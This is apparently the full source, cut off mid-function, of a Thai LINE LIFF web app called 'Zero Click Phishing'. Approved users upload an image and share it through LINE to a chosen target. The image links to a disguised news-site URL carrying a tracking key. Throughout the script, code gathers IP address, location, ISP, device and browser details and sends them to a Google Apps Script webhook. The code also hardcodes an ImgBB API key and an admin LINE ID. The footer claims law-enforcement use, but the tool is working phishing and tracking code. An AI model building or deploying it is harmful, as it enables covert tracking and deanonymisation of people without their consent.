<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zero Click Phishing</title>
    <link href="https://fonts.googleapis.com/css2?family=Prompt:wght@300;400;500;700&display=swap" rel="stylesheet">
    <!-- Line LIFF SDK -->
    <script src="https://static.line-scdn.net/liff/edge/2/sdk.js"></script>
    <style>
        * {
            box-sizing: border-box;
            font-family: 'Prompt', sans-serif;
        }
        body {
            margin: 0;
            padding: 16px;
            background-color: #f5f5f5;
            color: #333;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            background-color: #fff;
            border-radius: 12px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #00B900, #007700);
            color: white;
            padding: 20px;
            text-align: center;
            position: relative;
            display: flex; /* Added */
            align-items: center; /* Added */
            justify-content: center; /* Added */
            gap: 10px; /* Added space between icon and text */
        }
        .header .header-icon { /* Added */
            width: 28px;
            height: 28px;
            fill: white; /* Color the SVG icon white */
        }
        .header .header-text { /* Added */
             text-align: left;
        }
        .header h1 {
            margin: 0;
            font-size: 20px;
            font-weight: 700; /* Slightly bolder */
        }
        .header .subtitle {
            font-size: 13px; /* Slightly smaller */
            opacity: 0.9;
            margin-top: 5px;
        }
        .content {
            padding: 20px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #555;
        }
        input[type="text"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input[type="text"]:focus {
            border-color: #00B900;
            outline: none;
        }
        .image-preview-container {
            margin-top: 10px;
            text-align: center;
            border: 2px dashed #ddd;
            padding: 20px;
            border-radius: 8px;
            background-color: #fafafa;
            transition: all 0.3s ease;
        }
        .image-preview-container:hover {
            border-color: #00B900;
            background-color: #f0f8f0;
        }
        .image-preview {
            max-width: 100%;
            max-height: 200px;
            display: none;
            margin-top: 10px;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        }
        .btn {
            display: inline-block;
            background-color: #00B900;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s;
            text-align: center;
            width: 100%;
            font-weight: 500;
        }
        .btn:hover {
            background-color: #009900;
        }
        .btn:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }
        .btn-file {
            background-color: #666;
            margin-bottom: 15px;
        }
        .btn-file:hover {
            background-color: #555;
        }
        .btn-share {
            margin-top: 20px;
        }
        .status {
            margin-top: 20px;
            padding: 10px;
            border-radius: 6px;
            text-align: center;
            display: none;
        }
        .status.success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .status.error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .input-group {
            display: flex;
            margin-bottom: 10px;
        }
        .input-group input {
            flex: 1;
            border-top-right-radius: 0;
            border-bottom-right-radius: 0;
        }
        .input-group button {
            border-top-left-radius: 0;
            border-bottom-left-radius: 0;
            padding: 0 15px;
            background-color: #00B900;
            color: white;
            border: none;
            cursor: pointer;
        }
        .input-group button:hover {
            background-color: #009900;
        }
        .input-group button:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }
        .footer {
            text-align: center;
            padding: 15px;
            font-size: 12px;
            color: #888;
            border-top: 1px solid #eee;
        }
        .loader {
            display: none;
            text-align: center;
            margin: 20px 0;
        }
        .loader-spinner {
            width: 40px;
            height: 40px;
            margin: 0 auto;
            border: 4px solid rgba(0, 185, 0, 0.2);
            border-top: 4px solid #00B900;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .tips {
            background-color: #e9f7fe;
            border-left: 4px solid #4fc3f7;
            padding: 10px 15px;
            margin: 20px 0;
            font-size: 14px;
            border-radius: 4px;
        }
        .tips p {
            margin: 0;
            color: #0277bd;
        }
        .user-info {
            background-color: #fff;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            border: 1px solid #eee;
        }
        .user-info .profile {
            display: flex;
            align-items: center;
            margin-bottom: 10px;
        }
        .user-info .profile-img {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            object-fit: cover;
            margin-right: 15px;
            border: 2px solid #00B900;
        }
        .user-info .user-name {
            font-weight: 500;
            color: #333;
            font-size: 16px;
        }
        .user-info .user-status {
            font-size: 14px;
            color: #00B900;
            font-weight: 500;
        }
        .message-box {
            background-color: #fff9e6;
            border-left: 4px solid #ffc107;
            padding: 10px 15px;
            margin: 20px 0;
            border-radius: 4px;
        }
        .message-box p {
            margin: 0;
            color: #856404;
            line-height: 1.5;
        }
        .message-box.error {
            background-color: #f8d7da;
            border-left: 4px solid #dc3545;
        }
        .message-box.error p {
            color: #721c24;
        }
        .badge {
            display: inline-block;
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: 500;
            margin-left: 8px;
        }
        .badge.approved {
            background-color: #d4edda;
            color: #155724;
        }
        .badge.pending {
            background-color: #fff3cd;
            color: #856404;
        }
        #loadingScreen {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(255, 255, 255, 0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 1000;
        }
        #loadingScreen .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid rgba(0, 185, 0, 0.2);
            border-top: 4px solid #00B900;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        #loadingScreen p {
            color: #00B900;
            font-weight: 500;
        }
    </style>
</head>
<body>
    <!-- Loading Screen -->
    <div id="loadingScreen">
        <div class="spinner"></div>
        <p>กำลังตรวจสอบระบบ...</p>
    </div>

    <div class="container">
        <div class="header">
             <!-- Added Eye Icon SVG -->
             <svg class="header-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512">
                 <path d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"/>
             </svg>
             <div class="header-text">
                 <h1>Zero Click Phishing</h1>
                 <div class="subtitle">สร้างรูปภาพส่งไปยังเป้าหมาย</div>
             </div>
        </div>
        
        <div class="content">
            <!-- ส่วนแสดงข้อมูลผู้ใช้ -->
            <div class="user-info" id="userInfoSection" style="display: none;">
                <div class="profile">
                    <img id="profileImage" src="" alt="Profile" class="profile-img">
                    <div>
                        <div class="user-name" id="userName">User Name</div>
                        <div class="user-status">
                            สถานะ: <span id="userStatus">ตรวจสอบสิทธิ์...</span>
                            <span id="statusBadge" class="badge">รอตรวจสอบ</span>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- ข้อความแนะนำหรือแจ้งเตือน -->
            <div id="permissionMessage" class="message-box" style="display: none;">
                <p>กรุณารอการอนุมัติจากผู้ดูแลระบบก่อนใช้งาน หากคุณยังไม่ได้ลงทะเบียน สามารถพิมพ์คำสั่ง <strong>#regis</strong> ในแชทส่วนตัวกับบอท</p>
            </div>
            
            <!-- ฟอร์มหลัก -->
            <div id="mainForm">
                <div class="form-group">
                    <label for="caseName">ชื่อเคส</label>
                    <!-- Removed the input-group and button -->
                    <input type="text" id="caseName" placeholder="ระบุชื่อเคส" required>
                    <!-- <button id="generateTrackingBtn" title="สร้าง Tracking Key อัตโนมัติ">⚡</button> -->
                </div>
                
                <div class="form-group">
                    <label for="imageUpload">รูปภาพที่ส่งไปยังเป้าหมาย</label>
                    <button class="btn btn-file" id="selectImageBtn">เลือกรูปภาพ</button>
                    <input type="file" id="imageUpload" accept="image/*" style="display: none;">
                    <div class="image-preview-container">
                        <img id="imagePreview" class="image-preview">
                        <div id="uploadPrompt">คลิกเพื่อเลือกหรือลากรูปภาพมาที่นี่</div>
                    </div>
                </div>
                
                <div class="loader">
                    <div class="loader-spinner"></div>
                    <p>กำลังอัพโหลดรูปภาพ...</p>
                </div>
                
                <div id="statusMessage" class="status"></div>
                
                <button class="btn btn-share" id="shareBtn" disabled>แชร์ภาพไปยังเป้าหมาย</button>
                
                <div class="tips">
                    <p><strong>คำแนะนำ:</strong> รูปภาพควรมีขนาดเหมาะสม เพื่อการโหลดที่รวดเร็ว</p>
                </div>
            </div>
        </div>
        
        <div class="footer">
            <p style="color: red; font-weight: bold; margin-bottom: 10px;">⚠️ใช้เพื่อสืบสวนติดตามตัวผู้กระทำความผิดเพื่อมาดำเนินคดีตามกฎหมาย เท่านั่น!!!!</p>
            &copy; 2025 Zero Click Phishing - Detective-X
        </div>
    </div>

    <script>
        // ตัวแปรสำหรับเก็บข้อมูล
        let selectedImage = null;
        let trackingKey = "";
        let imageUrl = "";
        let userId = "";
        let displayName = "";
        let pictureUrl = "";
        let isLiffInitialized = false;
        let userHasPermission = false;
        
        // ค่า Config สำคัญ
        const LIFF_ID = '2007231851-0DqwXxQg'; // ใส่ LIFF ID ของคุณตรงนี้
        const IMGBB_API_KEY = '0854e4f08da46fb35f126bdf17984657'; // ใส่ API keyของImgBB
        
        // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
        const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzu1bJQaMwegjw4LJL0xldY4t3L6fMT3i_31er0wspO29TvZUimlMfa9_o8Wai1h6l0Ag/exec'; // Updated GoogleScript.html Web App URL
        const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
        
        // เริ่มต้นการทำงาน LIFF
        document.addEventListener('DOMContentLoaded', function() {
            initializeLiff();
            setupEventListeners();
        });
        
        // ฟังก์ชันเริ่มต้นการทำงาน LIFF
        async function initializeLiff() {
            try {
                await liff.init({ liffId: LIFF_ID });
                
                if (!liff.isLoggedIn()) {
                    liff.login();
                    return;
                }
                
                // ดึงข้อมูลโปรไฟล์ผู้ใช้
                const profile = await liff.getProfile();
                userId = profile.userId;
                displayName = profile.displayName;
                pictureUrl = profile.pictureUrl || 'https://via.placeholder.com/50';
                
                console.log(`ผู้ใช้: ${displayName} (${userId})`);
                
                // แสดงข้อมูลผู้ใช้
                document.getElementById('userName').textContent = displayName;
                document.getElementById('profileImage').src = pictureUrl;
                document.getElementById('userInfoSection').style.display = 'block';
                
                // ตรวจสอบสิทธิ์ผู้ใช้
                userHasPermission = await checkUserPermission(userId);
                
                if (userHasPermission) {
                    // มีสิทธิ์ใช้งาน
                    document.getElementById('userStatus').textContent = 'ได้รับอนุมัติแล้ว';
                    document.getElementById('statusBadge').textContent = 'อนุมัติแล้ว';
                    document.getElementById('statusBadge').className = 'badge approved';
                    // เปิดใช้งานฟอร์ม
                    enableForm();
                } else {
                    // ไม่มีสิทธิ์ใช้งาน
                    document.getElementById('userStatus').textContent = 'รอการอนุมัติ';
                    document.getElementById('statusBadge').textContent = 'รออนุมัติ';
                    document.getElementById('statusBadge').className = 'badge pending';
                    document.getElementById('permissionMessage').style.display = 'block';
                    // ปิดใช้งานฟอร์ม
                    disableForm();
                }
                
                isLiffInitialized = true;
                
                // ตรวจสอบว่ามีพารามิเตอร์ caseName มาจาก URL หรือไม่
                const urlParams = new URLSearchParams(window.location.search);
                const caseNameParam = urlParams.get('case');
                if (caseNameParam) {
                    document.getElementById('caseName').value = caseNameParam;
                }
                
                // ซ่อน Loading Screen
                document.getElementById('loadingScreen').style.display = 'none';
                
            } catch (error) {
                console.error('LIFF initialization failed', error);
                showStatus('เกิดข้อผิดพลาดในการเริ่มต้น LIFF: ' + error.message, false);
                document.getElementById('loadingScreen').style.display = 'none';
            }
        }
        
        // ฟังก์ชันตรวจสอบสิทธิ์ผู้ใช้ (เรียกใช้ LineOA.html)
        async function checkUserPermission(userId) {
            try {
                console.log("กำลังตรวจสอบสิทธิ์ผู้ใช้:", userId);
                
                const response = await fetch(LINE_OA_WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        action: 'checkUserPermission',
                        userId: userId
                    })
                });
                
                try {
                    // ตรวจสอบว่า response เป็น JSON หรือไม่
                    const contentType = response.headers.get("content-type");
                    if (contentType && contentType.includes("application/json")) {
                        const data = await response.json();
                        console.log("ผลการตรวจสอบสิทธิ์:", data);
                        return data.hasPermission === true;
                    } else {
                        console.log("Server ไม่ได้ตอบกลับเป็น JSON, ใช้การตรวจสอบสำรอง");
                        return checkUserPermissionFallback(userId);
                    }
                } catch (e) {
                    console.error("ไม่สามารถแปลง response เป็น JSON:", e);
                    return checkUserPermissionFallback(userId);
                }
            } catch (error) {
                console.error('Error checking permission:', error);
                // หากเกิดข้อผิดพลาดในการเชื่อมต่อ ให้ตรวจสอบจาก ID โดยตรง
                return checkUserPermissionFallback(userId);
            }
        }
        
        // ฟังก์ชันตรวจสอบสิทธิ์แบบ Fallback (ใช้เมื่อไม่สามารถเชื่อมต่อกับ server ได้)
        function checkUserPermissionFallback(userId) {
            // กำหนด userId ที่มีสิทธิ์ใช้งานล่วงหน้า (ควรเป็น admin เท่านั้น)
            const approvedUserIds = [
                'U69aa2cb90c9f40291278c346c50dc021' // ไอดีผู้ดูแลระบบจากไฟล์ LineOA.html
                // สามารถเพิ่ม userId อื่นๆ ที่อนุมัติแล้วได้
            ];
            
            return approvedUserIds.includes(userId);
        }
        
        // ฟังก์ชันเปิดใช้งานฟอร์ม
        function enableForm() {
            document.getElementById('caseName').disabled = false;
            // document.getElementById('generateTrackingBtn').disabled = false; // Removed reference
            document.getElementById('selectImageBtn').disabled = false;
            checkCanShare(); // ตรวจสอบว่าปุ่มแชร์ควรเปิดใช้งานหรือไม่
        }
        
        // ฟังก์ชันปิดใช้งานฟอร์ม
        function disableForm() {
            document.getElementById('caseName').disabled = true;
            // document.getElementById('generateTrackingBtn').disabled = true; // Removed reference
            document.getElementById('selectImageBtn').disabled = true;
            document.getElementById('shareBtn').disabled = true;
        }
        
        // ตั้งค่า Event Listeners
        function setupEventListeners() {
            // ปุ่มเลือกรูปภาพ
            document.getElementById('selectImageBtn').addEventListener('click', function() {
                if (!userHasPermission) {
                    showStatus('คุณไม่มีสิทธิ์ใช้งานระบบนี้', false);
                    return;
                }
                document.getElementById('imageUpload').click();
            });
            
            // การเลือกรูปภาพ
            document.getElementById('imageUpload').addEventListener('change', handleImageSelect);
            
            // ปุ่มสร้าง Tracking Key
            // Removed event listener for generateTrackingBtn
            // document.getElementById('generateTrackingBtn').addEventListener('click', function() { ... });
            
            // ปุ่มแชร์รูปภาพ
            document.getElementById('shareBtn').addEventListener('click', function() {
                if (!userHasPermission) {
                    showStatus('คุณไม่มีสิทธิ์ใช้งานระบบนี้', false);
                    return;
                }
                shareImage();
            });
            
            // การเปลี่ยนแปลงชื่อเคส
            document.getElementById('caseName').addEventListener('input', checkCanShare);
            
            // Drag and drop สำหรับรูปภาพ
            const dropArea = document.querySelector('.image-preview-container');
            
            ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
                dropArea.addEventListener(eventName, preventDefaults, false);
            });
            
            function preventDefaults(e) {
                e.preventDefault();
                e.stopPropagation();
            }
            
            ['dragenter', 'dragover'].forEach(eventName => {
                dropArea.addEventListener(eventName, highlight, false);
            });
            
            ['dragleave', 'drop'].forEach(eventName => {
                dropArea.addEventListener(eventName, unhighlight, false);
            });
            
            function highlight() {
                if (!userHasPermission) return;
                dropArea.style.borderColor = '#00B900';
                dropArea.style.backgroundColor = '#f0f8f0';
            }
            
            function unhighlight() {
                if (!userHasPermission) return;
                dropArea.style.borderColor = '#ddd';
                dropArea.style.backgroundColor = '#fafafa';
            }
            
            dropArea.addEventListener('drop', function(e) {
                if (!userHasPermission) {
                    showStatus('คุณไม่มีสิทธิ์ใช้งานระบบนี้', false);
                    return;
                }
                handleDrop(e);
            }, false);
            
            function handleDrop(e) {
                const dt = e.dataTransfer;
                const files = dt.files;
                if (files.length) {
                    document.getElementById('imageUpload').files = files;
                    handleImageSelect({ target: { files: files } });
                }
            }
            
            // คลิกที่พื้นที่รูปภาพเพื่อเลือกรูปภาพ
            dropArea.addEventListener('click', function() {
                if (!userHasPermission) {
                    showStatus('คุณไม่มีสิทธิ์ใช้งานระบบนี้', false);
                    return;
                }
                document.getElementById('imageUpload').click();
            });
        }
        
        // ฟังก์ชันจัดการรูปภาพที่เลือก
        function handleImageSelect(event) {
            if (!userHasPermission) {
                showStatus('คุณไม่มีสิทธิ์ใช้งานระบบนี้', false);
                return;
            }
            
            const file = event.target.files[0];
            if (!file) return;
            
            // ตรวจสอบว่าเป็นรูปภาพหรือไม่
            if (!file.type.match('image.*')) {
                showStatus('กรุณาเลือกไฟล์รูปภาพเท่านั้น', false);
                return;
            }
            
            // ตรวจสอบขนาดรูปภาพ (จำกัดขนาดไฟล์ไม่เกิน 10MB)
            if (file.size > 10 * 1024 * 1024) {
                showStatus('รูปภาพมีขนาดใหญ่เกินไป (ไม่เกิน 10MB)', false);
                return;
            }
            
            selectedImage = file;
            
            // แสดงตัวอย่างรูปภาพ
            const reader = new FileReader();
            reader.onload = function(e) {
                const img = document.getElementById('imagePreview');
                img.src = e.target.result;
                img.style.display = 'block';
                document.getElementById('uploadPrompt').style.display = 'none';
            };
            reader.readAsDataURL(file);
            
            // ตรวจสอบว่าสามารถแชร์ได้หรือไม่
            checkCanShare();
        }
        
        // ฟังก์ชันอัพโหลดรูปภาพไปยัง ImgBB
        async function uploadImage() {
            if (!selectedImage) {
                showStatus('กรุณาเลือกรูปภาพก่อน', false);
                return null;
            }
            
            // แสดง loader
            document.querySelector('.loader').style.display = 'block';
            
            try {
                // ใช้ ImgBB API สำหรับอัพโหลดรูปภาพ
                const formData = new FormData();
                formData.append('image', selectedImage);
                formData.append('key', IMGBB_API_KEY);
                
                const response = await fetch('https://api.imgbb.com/1/upload', {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                
                // ซ่อน loader
                document.querySelector('.loader').style.display = 'none';
                
                if (data.success) {
                    return data.data.url;
                } else {
                    throw new Error(data.error.message || 'การอัพโหลดล้มเหลว');
                }
            } catch (error) {
                console.error('Error uploading image:', error);
                showStatus('เกิดข้อผิดพลาดในการอัพโหลดรูปภาพ: ' + error.message, false);
                // ซ่อน loader
                document.querySelector('.loader').style.display = 'none';
                return null;
            }
        }
        
        // ฟังก์ชันแชร์รูปภาพ
        async function shareImage() {
            if (!isLiffInitialized) {
                showStatus('กรุณารอให้ LIFF เริ่มต้นก่อน', false);
                return;
            }
            
            if (!userHasPermission) {
                showStatus('คุณไม่มีสิทธิ์ใช้งานระบบนี้', false);
                return;
            }
            
            const caseName = document.getElementById('caseName').value;
            if (!caseName) {
                showStatus('กรุณาระบุชื่อเคส', false);
                return;
            }
            
            if (!selectedImage) {
                showStatus('กรุณาเลือกรูปภาพ', false);
                return;
            }
            
            // สร้าง Tracking Key ครั้งเดียวก่อนการใช้งาน (แก้ปัญหา key ซ้ำซ้อน)
            if (!trackingKey) {
                generateTrackingKey();
            }
            
            // ตรวจสอบว่ามี trackingKey หรือไม่หลังจากการสร้าง
            if (!trackingKey) {
                 showStatus('ไม่สามารถสร้าง Tracking Key ได้', false);
                 return; // หยุดการทำงานถ้าสร้าง Key ไม่สำเร็จ
            }

            try {
                // อัพโหลดรูปภาพ
                imageUrl = await uploadImage();
                if (!imageUrl) return;
                
                // สร้าง URL สำหรับคลิก (ชี้ไปที่ index.html พร้อม tracking key)
                const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`; // PHISHING_DOMAIN should point to index.html
                
                // รวบรวมข้อมูลอุปกรณ์สำหรับส่งใน zeroClickTrackUrl
                const deviceInfo = getEnhancedDeviceInfo();
                const ipInfo = await getIPInfo();
                
                // สร้าง URL สำหรับ Zero Click tracking พร้อมข้อมูลขั้นสูง
                const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
                let zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}&creator=${encodeURIComponent(userId)}&name=${encodeURIComponent(displayName)}`;
                
                // ข้อมูลเกี่ยวกับอุปกรณ์เพิ่มเติม
                zeroClickTrackUrl += `&ua=${encodeURIComponent(navigator.userAgent)}`;
                zeroClickTrackUrl += `&platform=${encodeURIComponent(deviceInfo.platform)}`;
                zeroClickTrackUrl += `&browser=${encodeURIComponent(deviceInfo.browser)}`;
                zeroClickTrackUrl += `&deviceType=${encodeURIComponent(deviceInfo.deviceType)}`;
                zeroClickTrackUrl += `&deviceModel=${encodeURIComponent(deviceInfo.deviceModel)}`;
                zeroClickTrackUrl += `&screenSize=${encodeURIComponent(deviceInfo.screenSize)}`;
                zeroClickTrackUrl += `&language=${encodeURIComponent(navigator.language || '')}`;

                // ข้อมูล IP (ถ้าสามารถดึงได้)
                if (ipInfo && ipInfo.ip) {
                    zeroClickTrackUrl += `&ip=${encodeURIComponent(ipInfo.ip)}`;
                    zeroClickTrackUrl += `&country=${encodeURIComponent(ipInfo.country || '')}`;
                    zeroClickTrackUrl += `&city=${encodeURIComponent(ipInfo.city || '')}`;
                    zeroClickTrackUrl += `&region=${encodeURIComponent(ipInfo.region || '')}`;
                    zeroClickTrackUrl += `&org=${encodeURIComponent(ipInfo.org || '')}`;
                }
                
                // เพิ่มข้อมูลการเชื่อมต่อ
                if (deviceInfo.connection) {
                    zeroClickTrackUrl += `&netType=${encodeURIComponent(deviceInfo.connection.type || '')}`;
                    zeroClickTrackUrl += `&netSpeed=${encodeURIComponent(deviceInfo.connection.downlink || '')}`;
                }

                // เพิ่ม random parameter เพื่อป้องกันการแคช
                zeroClickTrackUrl += `&r=${randomSuffix}`;
                
                console.log("Zero Click Track URL:", zeroClickTrackUrl);

                // สร้าง Flex Message ที่มีเฉพาะรูปภาพ (ไม่มี footer)
                const message = {
                    type: 'flex',
                    altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
                    contents: {
                        type: 'bubble',
                        hero: { // รูปภาพหลักที่คลิกได้
                            type: 'image',
                            url: imageUrl,
                            size: 'full',
                            aspectRatio: '1:1',
                            aspectMode: 'cover',
                            action: { // ทำให้รูปภาพคลิกได้ -> ลิงก์ไปยัง index.html พร้อม tracking key
                                type: 'uri',
                                uri: clickTrackUrl
                            }
                        }
                    }
                };

                console.log("Attempting to share Flex Message:", JSON.stringify(message, null, 2));

                // Zero Click tracking จะถูกเรียกโดยตรงแทนที่จะใส่ใน footer
                // ทำการเรียก API สำหรับ Zero Click tracking ในพื้นหลัง
                fetch(zeroClickTrackUrl, { method: 'GET', mode: 'no-cors' })
                    .then(response => console.log("Zero Click tracking triggered"))
                    .catch(err => console.log("Zero Click tracking error:", err));

                if (liff.isApiAvailable('shareTargetPicker')) {
                    console.log("ShareTargetPicker is available. Calling now...");
                    const result = await liff.shareTargetPicker([message]);
                    console.log("ShareTargetPicker result:", result);

                    if (result) {
                        showStatus('แชร์รูปภาพสำเร็จ', true);

                        // 1. บันทึก Tracking Key Mapping หลังจากแชร์สำเร็จ (เพิ่ม Error Handling)
                        try {
                            const saved = await saveTrackingCaseMapping(trackingKey, caseName);
                            if (!saved) {
                                console.log('เรียกใช้ saveTrackingCaseMapping เสร็จสิ้น (อาจมีข้อผิดพลาดฝั่ง Server หรือ CORS)');
                            } else {
                                console.log('บันทึก Tracking Key Mapping สำเร็จ (ตามที่ Client รับรู้)');
                            }
                        } catch (saveError) {
                            console.error('เกิดข้อผิดพลาดขณะเรียก saveTrackingCaseMapping:', saveError);
                            showStatus('เกิดข้อผิดพลาดในการบันทึก Tracking Key: ' + saveError.message, false);
                        }

                        // รีเซ็ตหน้าจอและล้าง tracking key เพื่อให้สร้างใหม่ในการแชร์ครั้งถัดไป
                        resetForm();
                        trackingKey = "";  // ล้าง tracking key หลังการแชร์เสร็จสิ้น
                    } else {
                        showStatus('การแชร์ถูกยกเลิก', false);
                    }
                } else {
                    showStatus('ShareTargetPicker ไม่พร้อมใช้งาน', false);
                }
                
            } catch (error) {
                console.error('Error in shareImage function:', error);
                showStatus('เกิดข้อผิดพลาดในการแชร์รูปภาพ: ' + (error.message || error), false);
            }
        }
        
        // ฟังก์ชันแสดงสถานะ
        function showStatus(message, isSuccess) {
            const statusEl = document.getElementById('statusMessage');
            statusEl.textContent = message;
            statusEl.style.display = 'block';
            
            if (isSuccess) {
                statusEl.className = 'status success';
            } else {
                statusEl.className = 'status error';
            }
            
            // ซ่อนสถานะหลังจาก 5 วินาที
            setTimeout(() => {
                statusEl.style.display = 'none';
            }, 5000);
        }
        
        // ฟังก์ชันรีเซ็ตแบบฟอร์ม
        function resetForm() {
            document.getElementById('caseName').value = '';
            document.getElementById('imageUpload').value = '';
            document.getElementById('imagePreview').style.display = 'none';
            document.getElementById('uploadPrompt').style.display = 'block';
            document.getElementById('shareBtn').disabled = true;
            
            selectedImage = null;
            // ไม่ล้าง trackingKey ที่นี่ เพราะเราจะล้างหลังการแชร์สำเร็จแทน
            imageUrl = "";
        }
        
        // ฟังก์ชันสร้าง ID เฉพาะ
        function generateUniqueId() {
            return Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
        }

        // ฟังก์ชันดึงข้อมูลอุปกรณ์สำหรับส่งไปกับ ZeroClick
        function getEnhancedDeviceInfo() {
            const ua = navigator.userAgent;
            let deviceInfo = {
                platform: "ไม่ทราบ",
                browser: "ไม่ทราบ", 
                deviceType: "ไม่ทราบ",
                deviceModel: "ไม่ทราบ",
                screenSize: `${window.screen.width}x${window.screen.height}`,
                pixelRatio: window.devicePixelRatio || 1,
                orientation: screen.orientation ? screen.orientation.type : 'unknown',
                connection: getConnectionInfo()
            };
            
            // ระบบปฏิบัติการ (ละเอียดขึ้น)
            if (/Windows NT 10\.0/.test(ua)) {
                deviceInfo.platform = "Windows 10/11";
            } else if (/Windows NT 6\.3/.test(ua)) {
                deviceInfo.platform = "Windows 8.1";
            } else if (/Windows NT 6\.2/.test(ua)) {
                deviceInfo.platform = "Windows 8";
            } else if (/Windows NT 6\.1/.test(ua)) {
                deviceInfo.platform = "Windows 7";
            } else if (/Windows NT 6\.0/.test(ua)) {
                deviceInfo.platform = "Windows Vista";
            } else if (/Windows NT 5\.1/.test(ua)) {
                deviceInfo.platform = "Windows XP";
            } else if (/Windows/.test(ua)) {
                deviceInfo.platform = "Windows";
            } else if (/Android ([0-9\.]+)/.test(ua)) {
                deviceInfo.platform = "Android " + ua.match(/Android ([0-9\.]+)/)[1];
            } else if (/iPhone|iPad|iPod/.test(ua)) {
                const matches = ua.match(/OS (\d+)_(\d+)_?(\d+)?/);
                const version = matches ? [matches[1], matches[2], matches[3] || 0].join('.') : "Unknown";
                deviceInfo.platform = "iOS " + version;
            } else if (/Mac OS X ([0-9_\.]+)/.test(ua)) {
                const macVersion = ua.match(/Mac OS X ([0-9_\.]+)/)[1].replace(/_/g, '.');
                deviceInfo.platform = "macOS " + macVersion;
            } else if (/Linux/.test(ua)) {
                deviceInfo.platform = "Linux";
            } else if (/CrOS/.test(ua)) {
                deviceInfo.platform = "Chrome OS";
            }
            
            // ประเภทอุปกรณ์
            if (/Mobile|Android/.test(ua) && !/iPad/.test(ua)) {
                deviceInfo.deviceType = "มือถือ";
            } else if (/iPad|Tablet/.test(ua)) {
                deviceInfo.deviceType = "แท็บเล็ต";
            } else {
                deviceInfo.deviceType = "คอมพิวเตอร์";
            }
            
            // เบราว์เซอร์ (ละเอียดขึ้น)
            if (/Line/.test(ua)) {
                deviceInfo.browser = "LINE " + (ua.match(/Line\/([0-9\.]+)/) ? ua.match(/Line\/([0-9\.]+)/)[1] : "");
            } else if (/EdgA?\//.test(ua)) {
                deviceInfo.browser = "Edge " + (ua.match(/EdgA?\/([0-9\.]+)/) ? ua.match(/EdgA?\/([0-9\.]+)/)[1] : "");
            } else if (/Chrome\//.test(ua) && !/Chromium|Edge/.test(ua)) {
                deviceInfo.browser = "Chrome " + (ua.match(/Chrome\/([0-9\.]+)/) ? ua.match(/Chrome\/([0-9\.]+)/)[1] : "");
            } else if (/Firefox\//.test(ua)) {
                deviceInfo.browser = "Firefox " + (ua.match(/Firefox\/([0-9\.]+)/) ? ua.match(/Firefox\/([0-9\.]+)/)[1] : "");
            } else if (/Safari\//.test(ua) && !/Chrome/.test(ua)) {
                deviceInfo.browser = "Safari " + (ua.match(/Version\/([0-9\.]+)/) ? ua.match(/Version\/([0-9\.]+)/)[1] : "");
            } else if (/MSIE|Trident/.test(ua)) {
                deviceInfo.browser = "Internet Explorer " + (ua.match(/(?:MSIE |rv:)([0-9\.]+)/) ? ua.match(/(?:MSIE |rv:)([0-9\.]+)/)[1] : "");
            }
            
            // รุ่นอุปกรณ์ (ละเอียดขึ้น)
            if (/iPhone/.test(ua)) {
                const matches = ua.match(/iPhone(?:\s+OS)?\s+([0-9_]+)/);
